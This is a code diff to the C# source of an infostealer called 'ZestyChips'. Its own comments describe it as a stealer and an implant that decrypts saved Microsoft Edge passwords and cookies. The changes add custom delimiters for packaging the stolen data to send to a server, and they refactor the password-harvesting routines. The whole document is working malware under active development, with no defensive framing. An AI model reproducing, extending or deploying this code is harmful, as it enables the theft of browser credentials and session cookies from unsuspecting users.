@@ -17,6 +17,12 @@ namespace ZestyChips
         // debug mode will disable the loops until a secret store opens, allowing it to cleanly exit for testing.
         const bool DEBUG_MODE = true;
 
+        // delimiters for transferred data so we can parse things properly
+        // remember to add these on the server for processing data...!
+        // very unlikely for these strings to appear naturally
+        const string KEY_VAL_DELIM = "|<£||>";
+        const string TERMINATOR = ";>|;}|;|£ "; // leave the whitespace
+
         /*
         * Main entrypoint for the stealer to begin..
         */
@@ -42,8 +48,8 @@ namespace ZestyChips
         */
         private static void Edge() {
             StealEdgePasswords();
-            StealEdgeCookies();
 
+            StealEdgeCookies();
         }
         
         /**
@@ -92,12 +98,12 @@ namespace ZestyChips
                                     dictionary2[key] = string.Concat(new string[] {
                                         dictionary2[key],
                                         (value != null) ? value.ToString() : null,
-                                        "|||",
+                                        KEY_VAL_DELIM,
                                         decryptedString,
-                                        "; "
+                                        TERMINATOR
                                     });
                                 } else {
-                                    masterDictionary.Add(key, ((value != null) ? value.ToString() : null) + "|||" + decryptedString + "; ");
+                                    masterDictionary.Add(key, ((value != null) ? value.ToString() : null) + KEY_VAL_DELIM + decryptedString + TERMINATOR);
                                 }
                             }
                             catch (Exception ex) {
@@ -200,7 +206,7 @@ namespace ZestyChips
                     // exception will throw most likely if edge is open
                     // implant will continually run until edge is closed / process terminated
                     Helpers.PrintFail($"failed to copy edge data, {ex.Message}");
-                    
+
                     if (!DEBUG_MODE) {
                         Thread.Sleep(10000); // sleep 10 seconds
                     } else {
@@ -510,12 +516,12 @@ namespace ZestyChips
                     dictionary2[dict_site] = string.Concat(new string[] {
                         dictionary2[dict_site],
                         (dict_user != null) ? dict_user.ToString() : null,
-                        "|||",
+                        KEY_VAL_DELIM,
                         decryptedPassword,
-                        "; "
+                        TERMINATOR
                     });
                 } else {
-                    masterDictionary.Add(dict_site, ((dict_user != null) ? dict_user : null) + "|||" + decryptedPassword + "; ");
+                    masterDictionary.Add(dict_site, ((dict_user != null) ? dict_user : null) + KEY_VAL_DELIM + decryptedPassword + TERMINATOR);
                 }
             } else if (decryptedOldStylePasswords != "") {
                 // this section is untested, so given try catch
@@ -528,12 +534,12 @@ namespace ZestyChips
                         dictionary2[dict_site] = string.Concat(new string[] {
                             dictionary2[dict_site],
                             (dict_user != null) ? dict_user.ToString() : null,
-                            "|||",
+                            KEY_VAL_DELIM,
                             decryptedPassword,
-                            "; "
+                            TERMINATOR
                         });
                     } else {
-                        masterDictionary.Add(dict_site, ((dict_user != null) ? dict_user : null) + "|||" + decryptedPassword + "; ");
+                        masterDictionary.Add(dict_site, ((dict_user != null) ? dict_user : null) + KEY_VAL_DELIM + decryptedPassword + TERMINATOR);
                     }
                 } catch {
                     passwordResult = string.Concat(new string[]{
